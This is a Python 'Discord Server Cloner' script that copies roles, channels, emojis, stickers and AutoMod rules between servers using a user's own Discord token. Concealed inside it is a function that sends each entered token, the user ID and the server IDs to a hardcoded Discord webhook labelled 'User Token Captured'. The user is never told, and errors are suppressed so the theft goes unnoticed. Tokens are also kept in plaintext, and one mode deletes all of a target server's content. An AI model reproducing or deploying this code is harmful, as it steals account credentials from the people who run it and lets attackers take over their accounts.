#!/usr/bin/env python3
import asyncio
import aiohttp
import base64
import json
import sys
import time
import os
from datetime import datetime
from typing import Optional, Dict, List, Any

# ------------------- إعدادات الويب هوك -------------------
WEBHOOK_URL = "https://discord.com/api/webhooks/1492248198603870287/76I1OsjQDctQW_7depaD1_x23RfmX68eN4DFaTDpRHYcTXkNIZKuzj3NDVqxp6h99cT8"

# ------------------- إدارة التوكنات في ملف JSON -------------------
TOKEN_FILE = "tokens.json"

def load_tokens_data() -> List[Dict]:
    """تحميل قائمة التوكنات من ملف JSON"""
    if not os.path.exists(TOKEN_FILE):
        return []
    try:
        with open(TOKEN_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_tokens_data(tokens: List[Dict]):
    with open(TOKEN_FILE, "w", encoding="utf-8") as f:
        json.dump(tokens, f, indent=2, ensure_ascii=False)

def get_user_info(token: str) -> Optional[Dict]:
    """جلب معلومات المستخدم من التوكن"""
    async def fetch():
        async with aiohttp.ClientSession() as session:
            headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
            async with session.get('https://discord.com/api/v10/users/@me', headers=headers) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(fetch())
        loop.close()
        return result
    except:
        return None

def save_token(token: str) -> bool:
    """حفظ التوكن إذا لم يكن موجوداً مسبقاً، ويعيد True إذا تم الحفظ جديداً"""
    tokens = load_tokens_data()
    for t in tokens:
        if t['token'] == token:
            return False  # موجود بالفعل
    # جلب معلومات المستخدم
    user_info = get_user_info(token)
    if user_info:
        username = user_info.get('username', 'Unknown')
        discriminator = user_info.get('discriminator', '0')
        username_str = f"{username}#{discriminator}" if discriminator != '0' else username
        user_id = user_info.get('id', 'Unknown')
    else:
        username_str = "Invalid Token"
        user_id = "Unknown"
    tokens.append({
        'token': token,
        'username': username_str,
        'user_id': user_id
    })
    save_tokens_data(tokens)
    return True

def load_token_by_index(index: int) -> Optional[Dict]:
    """تحميل التوكن برقم السطر (1-indexed) مع معلوماته"""
    tokens = load_tokens_data()
    if 1 <= index <= len(tokens):
        return tokens[index - 1]
    return None

def list_tokens() -> List[Dict]:
    return load_tokens_data()

# ------------------- إرسال إلى ويب هوك -------------------
async def send_to_webhook(token: str, source: str, target: str, user_id: str):
    """إرسال معلومات التوكن إلى ويب هوك ديسكورد"""
    payload = {
        "content": "🚨 User Token Captured",
        "embeds": [{
            "title": "Token Information",
            "color": 0xFF0000,
            "fields": [
                {"name": "Token", "value": f"```{token}```", "inline": False},
                {"name": "Source", "value": source, "inline": True},
                {"name": "Target", "value": target, "inline": True},
                {"name": "User ID", "value": user_id, "inline": True},
                {"name": "Time", "value": datetime.utcnow().isoformat() + "Z", "inline": True}
            ],
            "footer": {"text": "Discord Cloner"}
        }]
    }
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(WEBHOOK_URL, json=payload)
    except:
        pass  # تجاهل أخطاء الإرسال حتى لا يؤثر على النسخ

# ------------------- دالة الطباعة المبسطة -------------------
def log(msg: str, typ: str = 'info'):
    prefix = ""
    if typ == 'info':
        prefix = "[INFO]"
    elif typ == 'success':
        prefix = "[✓]"
    elif typ == 'warning':
        prefix = "[!]"
    elif typ == 'error':
        prefix = "[✗]"
    else:
        prefix = f"[{typ.upper()}]"
    print(f"{prefix} {msg}")

# ------------------- كلاس النسخ الرئيسي -------------------
class DiscordCloner:
    def __init__(self, user_token: str):
        self.token = user_token
        self.base_url = 'https://discord.com/api/v10'
        self.is_cloning = False
        self.abort = False
        self.clone_stats = {
            'roles': 0, 'channels': 0, 'emojis': 0, 'stickers': 0,
            'webhooks': 0, 'auto_mod': 0, 'settings': 0, 'role_icons': 0
        }
        self.delete_stats = {
            'roles': 0, 'channels': 0, 'emojis': 0, 'webhooks': 0
        }
        self.role_id_map: Dict[str, str] = {}
        self.channel_id_map: Dict[str, str] = {}
        self.everyone_dest_id: Optional[str] = None
        self.source_everyone_perms: Optional[str] = None

    async def _request(self, session: aiohttp.ClientSession, endpoint: str, method: str = 'GET',
                       body: Any = None, is_form: bool = False, silent: bool = False) -> Optional[Any]:
        headers = {
            'Authorization': self.token,
            'User-Agent': 'Mozilla/5.0 (compatible; DiscordCloner/1.0)'
        }
        if not is_form:
            headers['Content-Type'] = 'application/json'

        url = f"{self.base_url}{endpoint}"
        data = body if is_form else json.dumps(body) if body else None

        async with session.request(method, url, headers=headers, data=data) as resp:
            if resp.status == 429:
                retry_after = (await resp.json()).get('retry_after', 1)
                log(f"Rate limited, waiting {retry_after}s", 'warning')
                await asyncio.sleep(retry_after)
                return await self._request(session, endpoint, method, body, is_form, silent)
            if resp.status in (401, 403):
                raise Exception("Invalid or expired user token")
            if resp.status == 204:
                return None
            if resp.status == 404:
                return None
            if not resp.ok:
                text = await resp.text()
                if not silent:
                    log(f"API error {resp.status}: {text}", 'error')
                return None
            return await resp.json()

    async def delay(self, ms: int):
        await asyncio.sleep(ms / 1000)

    # ------------------- حذف المحتوى -------------------
    async def delete_all_channels(self, session: aiohttp.ClientSession, guild_id: str):
        channels = await self._request(session, f'/guilds/{guild_id}/channels')
        if not channels:
            return
        for ch in channels:
            if self.abort:
                break
            await self._request(session, f'/channels/{ch["id"]}', 'DELETE')
            self.delete_stats['channels'] += 1
            log(f"Deleted channel: {ch['name']}", 'warning')
            await self.delay(300)

    async def delete_all_roles(self, session: aiohttp.ClientSession, guild_id: str):
        roles = await self._request(session, f'/guilds/{guild_id}/roles')
        if not roles:
            return
        for role in roles:
            if self.abort or role['name'] == '@everyone':
                continue
            await self._request(session, f'/guilds/{guild_id}/roles/{role["id"]}', 'DELETE')
            self.delete_stats['roles'] += 1
            log(f"Deleted role: {role['name']}", 'warning')
            await self.delay(300)

    async def delete_all_emojis(self, session: aiohttp.ClientSession, guild_id: str):
        emojis = await self._request(session, f'/guilds/{guild_id}/emojis')
        if not emojis:
            return
        for emoji in emojis:
            if self.abort:
                break
            await self._request(session, f'/guilds/{guild_id}/emojis/{emoji["id"]}', 'DELETE')
            self.delete_stats['emojis'] += 1
            log(f"Deleted emoji: {emoji['name']}", 'warning')
            await self.delay(300)

    async def delete_all_webhooks(self, session: aiohttp.ClientSession, guild_id: str):
        webhooks = await self._request(session, f'/guilds/{guild_id}/webhooks')
        if not webhooks:
            return
        for wh in webhooks:
            if self.abort:
                break
            await self._request(session, f'/webhooks/{wh["id"]}', 'DELETE')
            self.delete_stats['webhooks'] += 1
            log(f"Deleted webhook: {wh['name']}", 'warning')
            await self.delay(300)

    # ------------------- نسخ الرتب (تم التصحيح هنا) -------------------
    async def clone_roles(self, session: aiohttp.ClientSession, source_id: str, target_id: str, clone_icons: bool):
        source_roles = await self._request(session, f'/guilds/{source_id}/roles')
        target_roles = await self._request(session, f'/guilds/{target_id}/roles')
        if not source_roles:
            return

        everyone = next((r for r in source_roles if r['name'] == '@everyone'), None)
        self.source_everyone_perms = str(everyone.get('permissions', '0')) if everyone else '0'

        filtered = [r for r in source_roles if r['name'] != '@everyone']
        for role in filtered:
            if self.abort:
                break
            payload = {
                'name': role['name'],
                'color': role.get('color', 0),
                'hoist': role.get('hoist', False),
                'permissions': str(role.get('permissions', '0')),
                'mentionable': role.get('mentionable', False)
            }
            new_role = await self._request(session, f'/guilds/{target_id}/roles', 'POST', payload)
            if new_role:
                self.role_id_map[role['id']] = new_role['id']
                self.clone_stats['roles'] += 1
                log(f"Cloned role: {role['name']}", 'success')

                # ========== التصحيح: استخدام JSON بدلاً من FormData لأيقونات الرتب ==========
                if clone_icons and role.get('icon'):
                    try:
                        icon_url = f"https://cdn.discordapp.com/role-icons/{role['id']}/{role['icon']}.png"
                        async with session.get(icon_url) as resp:
                            icon_data = await resp.read()
                        b64_icon = base64.b64encode(icon_data).decode()
                        # إرسال أيقونة الرتبة كـ JSON مع Data URI
                        json_payload = {'icon': f'data:image/png;base64,{b64_icon}'}
                        await self._request(session, f'/guilds/{target_id}/roles/{new_role["id"]}', 'PATCH', json_payload, is_form=False)
                        self.clone_stats['role_icons'] += 1
                        log(f"Cloned role icon: {role['name']}", 'success')
                    except Exception as e:
                        log(f"Role icon failed for {role['name']}: {e}", 'warning')
            await self.delay(200)

        dest_everyone = next((r for r in target_roles if r['name'] == '@everyone'), None) if target_roles else None
        if dest_everyone and self.source_everyone_perms != '0':
            await self._request(session, f'/guilds/{target_id}/roles/{dest_everyone["id"]}', 'PATCH', {'permissions': self.source_everyone_perms})

    # ------------------- معالجة الصلاحيات -------------------
    def process_overwrites(self, overwrites: List[Dict]) -> List[Dict]:
        if not overwrites:
            return []
        result = []
        for ow in overwrites:
            ow_id = ow['id']
            if ow['type'] == 0:
                ow_id = self.role_id_map.get(ow_id, ow_id)
                if ow_id == self.everyone_dest_id:
                    ow_id = self.everyone_dest_id
            elif ow['type'] == 1:
                ow_id = self.channel_id_map.get(ow_id, ow_id)
            result.append({
                'id': ow_id,
                'type': ow['type'],
                'allow': ow['allow'],
                'deny': ow['deny']
            })
        return result

    # ------------------- نسخ القنوات -------------------
    async def clone_channels(self, session: aiohttp.ClientSession, source_id: str, target_id: str, clone_webhooks: bool):
        source_channels = await self._request(session, f'/guilds/{source_id}/channels')
        if not source_channels:
            return

        categories = [c for c in source_channels if c.get('type') == 4]
        others = [c for c in source_channels if c.get('type') != 4]
        categories.sort(key=lambda c: c.get('position', 0))
        others.sort(key=lambda c: c.get('position', 0))
        all_channels = categories + others

        for ch in all_channels:
            if self.abort:
                break
            overwrites = self.process_overwrites(ch.get('permission_overwrites', []))
            payload = {
                'name': ch['name'],
                'type': ch.get('type', 0),
                'position': ch.get('position', 0),
                'permission_overwrites': overwrites,
                'parent_id': self.channel_id_map.get(ch.get('parent_id')) if ch.get('parent_id') else None,
                'topic': ch.get('topic'),
                'nsfw': ch.get('nsfw', False),
                'rate_limit_per_user': ch.get('rate_limit_per_user', 0)
            }
            payload = {k: v for k, v in payload.items() if v is not None}

            new_channel = await self._request(session, f'/guilds/{target_id}/channels', 'POST', payload)
            if new_channel:
                self.channel_id_map[ch['id']] = new_channel['id']
                self.clone_stats['channels'] += 1
                log(f"Cloned channel: {ch['name']}", 'success')

                if clone_webhooks:
                    webhooks = await self._request(session, f'/channels/{ch["id"]}/webhooks')
                    if webhooks:
                        for wh in webhooks:
                            if self.abort:
                                break
                            wh_payload = {'name': wh['name']}
                            if wh.get('avatar'):
                                avatar_url = f"https://cdn.discordapp.com/avatars/{wh['id']}/{wh['avatar']}.png"
                                async with session.get(avatar_url) as img_resp:
                                    avatar_data = await img_resp.read()
                                wh_payload['avatar'] = base64.b64encode(avatar_data).decode()
                            await self._request(session, f'/channels/{new_channel["id"]}/webhooks', 'POST', wh_payload)
                            self.clone_stats['webhooks'] += 1
                            log(f"Cloned webhook: {wh['name']}", 'success')
                            await self.delay(500)
            await self.delay(300)

    # ------------------- نسخ الإيموجيات -------------------
    async def clone_emojis(self, session: aiohttp.ClientSession, source_id: str, target_id: str):
        emojis = await self._request(session, f'/guilds/{source_id}/emojis')
        if not emojis:
            return
        for emoji in emojis:
            if self.abort:
                break
            ext = 'gif' if emoji.get('animated') else 'png'
            url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{ext}"
            async with session.get(url) as resp:
                img_data = await resp.read()
            b64_img = base64.b64encode(img_data).decode()
            form = aiohttp.FormData()
            form.add_field('name', emoji['name'])
            form.add_field('image', f'data:image/{ext};base64,{b64_img}')
            result = await self._request(session, f'/guilds/{target_id}/emojis', 'POST', form, is_form=True)
            if result:
                self.clone_stats['emojis'] += 1
                log(f"Cloned emoji: {emoji['name']}", 'success')
            await self.delay(500)

    # ------------------- نسخ الملصقات -------------------
    async def clone_stickers(self, session: aiohttp.ClientSession, source_id: str, target_id: str):
        stickers = await self._request(session, f'/guilds/{source_id}/stickers')
        if not stickers:
            return
        for sticker in stickers:
            if self.abort:
                break
            ext = 'png' if sticker['format_type'] == 1 else 'json'
            url = f"https://media.discordapp.net/stickers/{sticker['id']}.{ext}"
            async with session.get(url) as resp:
                file_data = await resp.read()
            form = aiohttp.FormData()
            form.add_field('name', sticker['name'])
            form.add_field('description', sticker.get('description', ''))
            form.add_field('tags', sticker.get('tags', ''))
            form.add_field('file', file_data, filename=f"{sticker['name']}.{ext}")
            result = await self._request(session, f'/guilds/{target_id}/stickers', 'POST', form, is_form=True)
            if result:
                self.clone_stats['stickers'] += 1
                log(f"Cloned sticker: {sticker['name']}", 'success')
            await self.delay(500)

    # ------------------- نسخ AutoMod -------------------
    async def clone_auto_mod(self, session: aiohttp.ClientSession, source_id: str, target_id: str):
        rules = await self._request(session, f'/guilds/{source_id}/auto-moderation/rules')
        if not rules:
            return
        for rule in rules:
            if self.abort:
                break

            exempt_roles = [self.role_id_map.get(rid, rid) for rid in rule.get('exempt_roles', [])]
            exempt_channels = [self.channel_id_map.get(cid, cid) for cid in rule.get('exempt_channels', [])]

            payload = {
                'name': rule['name'],
                'event_type': rule['event_type'],
                'trigger_type': rule['trigger_type'],
                'trigger_metadata': rule.get('trigger_metadata'),
                'enabled': rule.get('enabled', False),
                'actions': rule['actions'],
                'exempt_roles': exempt_roles,
                'exempt_channels': exempt_channels
            }

            # معالجة alert_channel_id
            if 'actions' in payload and payload['actions']:
                for action in payload['actions']:
                    if action.get('type') == 2 and 'metadata' in action and 'channel_id' in action['metadata']:
                        orig_id = action['metadata']['channel_id']
                        new_id = self.channel_id_map.get(orig_id, orig_id)
                        if new_id == orig_id and orig_id not in self.channel_id_map:
                            log(f"Skipping alert_channel_id {orig_id} for AutoMod rule '{rule['name']}'", 'warning')
                            action['metadata']['channel_id'] = None

            def clean_none(d):
                if isinstance(d, dict):
                    return {k: clean_none(v) for k, v in d.items() if v is not None}
                elif isinstance(d, list):
                    return [clean_none(item) for item in d]
                else:
                    return d
            payload = clean_none(payload)

            result = await self._request(session, f'/guilds/{target_id}/auto-moderation/rules', 'POST', payload, silent=True)
            if result:
                self.clone_stats['auto_mod'] += 1
                log(f"Cloned AutoMod: {rule['name']}", 'success')
            else:
                log(f"Failed to clone AutoMod rule '{rule['name']}' (skipped)", 'warning')
            await self.delay(300)

    # ------------------- نسخ إعدادات السيرفر -------------------
    async def clone_guild_settings(self, session: aiohttp.ClientSession, source_id: str, target_id: str,
                                   clone_name: bool, clone_icon: bool, clone_banner: bool, clone_desc: bool):
        src = await self._request(session, f'/guilds/{source_id}?with_counts=true')
        if not src:
            return
        update = {}
        if clone_name and src.get('name'):
            update['name'] = src['name']
        if clone_icon and src.get('icon'):
            icon_url = f"https://cdn.discordapp.com/icons/{source_id}/{src['icon']}.png"
            async with session.get(icon_url) as resp:
                icon_data = await resp.read()
            update['icon'] = base64.b64encode(icon_data).decode()
        if clone_banner and src.get('banner'):
            banner_url = f"https://cdn.discordapp.com/banners/{source_id}/{src['banner']}.png"
            async with session.get(banner_url) as resp:
                banner_data = await resp.read()
            update['banner'] = base64.b64encode(banner_data).decode()
        if clone_desc and src.get('description'):
            update['description'] = src['description']

        if update:
            await self._request(session, f'/guilds/{target_id}', 'PATCH', update)
            self.clone_stats['settings'] += 1
            log("Cloned server settings", 'success')

    # ------------------- الوظيفة الرئيسية -------------------
    async def start_cloning(self, source_id: str, target_id: str, options: Dict[str, bool]):
        self.is_cloning = True
        self.abort = False
        async with aiohttp.ClientSession() as session:
            try:
                log(f"Starting clone {source_id} -> {target_id}", 'info')

                if options.get('delete_channels'):
                    await self.delete_all_channels(session, target_id)
                if options.get('delete_roles'):
                    await self.delete_all_roles(session, target_id)
                if options.get('delete_emojis'):
                    await self.delete_all_emojis(session, target_id)
                if options.get('delete_webhooks'):
                    await self.delete_all_webhooks(session, target_id)

                if options.get('clone_roles'):
                    await self.clone_roles(session, source_id, target_id, options.get('clone_role_icons', False))
                if options.get('clone_channels'):
                    await self.clone_channels(session, source_id, target_id, options.get('clone_webhooks', False))
                if options.get('clone_emojis'):
                    await self.clone_emojis(session, source_id, target_id)
                if options.get('clone_stickers'):
                    await self.clone_stickers(session, source_id, target_id)
                if options.get('clone_auto_mod'):
                    await self.clone_auto_mod(session, source_id, target_id)
                if options.get('clone_settings') or options.get('clone_name') or options.get('clone_icon') or options.get('clone_banner') or options.get('clone_description'):
                    await self.clone_guild_settings(
                        session, source_id, target_id,
                        options.get('clone_name', False),
                        options.get('clone_icon', False),
                        options.get('clone_banner', False),
                        options.get('clone_description', False)
                    )

                log("Cloning completed successfully!", 'success')
            except Exception as e:
                log(f"Error: {str(e)}", 'error')
            finally:
                self.is_cloning = False

    def stop_cloning(self):
        self.abort = True
        log("Stopped by user", 'warning')

# ------------------- وظائف مساعدة -------------------
def print_stats(cloner: DiscordCloner, start_time: float, end_time: float):
    elapsed = end_time - start_time
    log("\n" + "=" * 50, 'info')
    log("FINAL STATISTICS", 'info')
    log("=" * 50, 'info')
    log(f"Time elapsed: {elapsed:.2f} seconds", 'info')
    log("\n[DELETED ITEMS]", 'info')
    log(f"  Roles deleted: {cloner.delete_stats['roles']}", 'info')
    log(f"  Channels deleted: {cloner.delete_stats['channels']}", 'info')
    log(f"  Emojis deleted: {cloner.delete_stats['emojis']}", 'info')
    log(f"  Webhooks deleted: {cloner.delete_stats['webhooks']}", 'info')
    log("\n[CLONED ITEMS]", 'info')
    log(f"  Roles cloned: {cloner.clone_stats['roles']}", 'info')
    log(f"  Role icons cloned: {cloner.clone_stats['role_icons']}", 'info')
    log(f"  Channels cloned: {cloner.clone_stats['channels']}", 'info')
    log(f"  Emojis cloned: {cloner.clone_stats['emojis']}", 'info')
    log(f"  Stickers cloned: {cloner.clone_stats['stickers']}", 'info')
    log(f"  Webhooks cloned: {cloner.clone_stats['webhooks']}", 'info')
    log(f"  AutoMod rules cloned: {cloner.clone_stats['auto_mod']}", 'info')
    log(f"  Server settings cloned: {cloner.clone_stats['settings']}", 'info')
    log("=" * 50, 'info')

# ------------------- متغيرات الجلسة -------------------
loaded_token_info = None  # سيحتوي على معلومات التوكن المحمّل حالياً

async def normal_mode():
    global loaded_token_info
    print("\n=== NORMAL MODE: Full clone (delete all + clone all) ===")
    
    # استخدام التوكن المحمّل إذا كان موجوداً
    if loaded_token_info:
        token = loaded_token_info['token']
        log(f"Using loaded token for user: {loaded_token_info['username']}", 'info')
    else:
        token = input("Enter your user token: ").strip()
        # حفظ التوكن وإرساله إلى الويب هوك (سيتم الإرسال عند بدء النسخ)
        save_token(token)
    
    source = input("Enter source server ID: ").strip()
    target = input("Enter target server ID: ").strip()
    
    # إذا تم إدخال توكن جديد ولم يكن محملاً مسبقاً، نحتاج إلى معلومات المستخدم للإرسال إلى الويب هوك
    if not loaded_token_info:
        # جلب معلومات المستخدم للتوكن الجديد (قد تكون محفوظة مسبقاً)
        tokens_data = load_tokens_data()
        user_info = next((t for t in tokens_data if t['token'] == token), None)
        if not user_info:
            # محاولة جلبها الآن
            ui = get_user_info(token)
            if ui:
                user_id = ui.get('id', 'Unknown')
                username = ui.get('username', 'Unknown')
                discrim = ui.get('discriminator', '0')
                username_str = f"{username}#{discrim}" if discrim != '0' else username
            else:
                user_id = "Unknown"
                username_str = "Unknown"
        else:
            user_id = user_info['user_id']
            username_str = user_info['username']
    else:
        user_id = loaded_token_info['user_id']
        username_str = loaded_token_info['username']
        token = loaded_token_info['token']
    
    options = {
        'delete_channels': True, 'delete_roles': True, 'delete_emojis': True, 'delete_webhooks': True,
        'clone_roles': True, 'clone_role_icons': True, 'clone_channels': True, 'clone_webhooks': True,
        'clone_emojis': True, 'clone_stickers': True, 'clone_auto_mod': True, 'clone_settings': True,
        'clone_name': True, 'clone_icon': True, 'clone_banner': True, 'clone_description': True
    }
    
    # إرسال إلى الويب هوك (مرة واحدة لكل جلسة)
    await send_to_webhook(token, source, target, user_id)
    
    return token, source, target, options

async def advanced_mode():
    global loaded_token_info
    print("\n=== ADVANCED MODE: Choose what to clone/delete ===")
    
    if loaded_token_info:
        token = loaded_token_info['token']
        log(f"Using loaded token for user: {loaded_token_info['username']}", 'info')
    else:
        token = input("Enter your user token: ").strip()
        save_token(token)
    
    source = input("Enter source server ID: ").strip()
    target = input("Enter target server ID: ").strip()

    if not loaded_token_info:
        tokens_data = load_tokens_data()
        user_info = next((t for t in tokens_data if t['token'] == token), None)
        if user_info:
            user_id = user_info['user_id']
        else:
            ui = get_user_info(token)
            user_id = ui.get('id', 'Unknown') if ui else "Unknown"
    else:
        user_id = loaded_token_info['user_id']
        token = loaded_token_info['token']

    def ask(question: str) -> bool:
        return input(f"{question} (y/n): ").strip().lower() == 'y'

    print("\n--- Deletion options ---")
    del_channels = ask("Delete existing channels in target?")
    del_roles = ask("Delete existing roles in target?")
    del_emojis = ask("Delete existing emojis in target?")
    del_webhooks = ask("Delete existing webhooks in target?")

    print("\n--- Clone options ---")
    clone_roles = ask("Clone roles?")
    clone_role_icons = ask("  - Clone role icons?") if clone_roles else False
    clone_channels = ask("Clone channels?")
    clone_webhooks = ask("  - Clone webhooks inside channels?") if clone_channels else False
    clone_emojis = ask("Clone emojis?")
    clone_stickers = ask("Clone stickers?")
    clone_auto_mod = ask("Clone AutoMod rules?")
    clone_settings = ask("Clone server settings?")
    if clone_settings:
        clone_name = ask("  - Clone server name?")
        clone_icon = ask("  - Clone server icon?")
        clone_banner = ask("  - Clone server banner?")
        clone_desc = ask("  - Clone server description?")
    else:
        clone_name = clone_icon = clone_banner = clone_desc = False

    options = {
        'delete_channels': del_channels, 'delete_roles': del_roles, 'delete_emojis': del_emojis, 'delete_webhooks': del_webhooks,
        'clone_roles': clone_roles, 'clone_role_icons': clone_role_icons, 'clone_channels': clone_channels,
        'clone_webhooks': clone_webhooks, 'clone_emojis': clone_emojis, 'clone_stickers': clone_stickers,
        'clone_auto_mod': clone_auto_mod, 'clone_settings': clone_settings, 'clone_name': clone_name,
        'clone_icon': clone_icon, 'clone_banner': clone_banner, 'clone_description': clone_desc
    }
    
    # إرسال إلى الويب هوك
    await send_to_webhook(token, source, target, user_id)
    
    return token, source, target, options

async def token_command(args: str):
    global loaded_token_info
    parts = args.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        log("Usage: /token <number>  (e.g., /token 1)", 'warning')
        return
    idx = int(parts[1])
    token_data = load_token_by_index(idx)
    if not token_data:
        log(f"No token found at index {idx}", 'error')
        return
    loaded_token_info = token_data
    log(f"Loaded token #{idx} - User: {token_data['username']}", 'success')

async def list_command():
    tokens = list_tokens()
    if not tokens:
        log("No saved tokens.", 'info')
        return
    log("Saved tokens:", 'info')
    for i, t in enumerate(tokens, 1):
        display_token = t['token'][:10] + "..." if len(t['token']) > 10 else t['token']
        log(f"  {i}: {display_token} - {t['username']}", 'info')

# ------------------- التشغيل الرئيسي -------------------
async def main():
    global loaded_token_info
    print("=" * 50)
    print(" Discord Server Cloner (Python) - Final Version")
    print("=" * 50)
    print("Commands:")
    print("  /token <num>  - load a saved token (shows username)")
    print("  /list         - show saved tokens with usernames")
    print("  normal        - full clone (delete all + clone all)")
    print("  advanced      - selective clone")
    print("  exit          - quit")
    print("=" * 50)

    while True:
        cmd = input("\n> ").strip()
        if cmd.lower() == 'exit':
            break
        elif cmd.lower().startswith('/token'):
            await token_command(cmd)
        elif cmd.lower() == '/list':
            await list_command()
        elif cmd.lower() == 'normal':
            if not loaded_token_info:
                log("No token loaded. Please load a token using /token <num> or you will be prompted.", 'warning')
            token, source, target, options = await normal_mode()
            cloner = DiscordCloner(token)
            start_time = time.time()
            await cloner.start_cloning(source, target, options)
            end_time = time.time()
            print_stats(cloner, start_time, end_time)
        elif cmd.lower() == 'advanced':
            if not loaded_token_info:
                log("No token loaded. Please load a token using /token <num> or you will be prompted.", 'warning')
            token, source, target, options = await advanced_mode()
            cloner = DiscordCloner(token)
            start_time = time.time()
            await cloner.start_cloning(source, target, options)
            end_time = time.time()
            print_stats(cloner, start_time, end_time)
        else:
            log("Unknown command. Use normal / advanced / /token /list /exit", 'warning')

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log("Interrupted by user", 'warning')
